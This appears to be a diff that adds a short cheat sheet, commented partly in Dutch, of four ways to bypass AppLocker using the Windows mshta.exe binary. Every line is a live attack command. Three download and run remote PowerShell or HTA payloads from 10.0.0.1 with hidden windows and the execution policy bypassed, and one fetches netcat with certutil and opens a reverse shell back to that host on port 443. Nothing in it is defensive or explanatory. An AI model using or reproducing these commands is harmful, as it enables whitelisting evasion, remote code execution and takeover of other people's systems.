@@ -1,0 +1,9 @@
+# AppLocker bypass via MSHTA.exe (whitelisted LOLBin)
+# Methode 1: Inline VBScript - download cradle
+mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/payloads/amsi-shell.ps1')"":close")
+# Methode 2: HTA bestand via URL
+mshta http://10.0.0.1/payloads/shell.hta
+# Methode 3: Inline JavaScript
+mshta javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/payloads/amsi-shell.ps1')");
+# Methode 4: Via COM object (alternatief)
+mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd /c certutil -urlcache -f http://10.0.0.1/tools/nc.exe C:\Windows\tasks\nc.exe && C:\Windows\tasks\nc.exe 10.0.0.1 443 -e cmd.exe"":close")
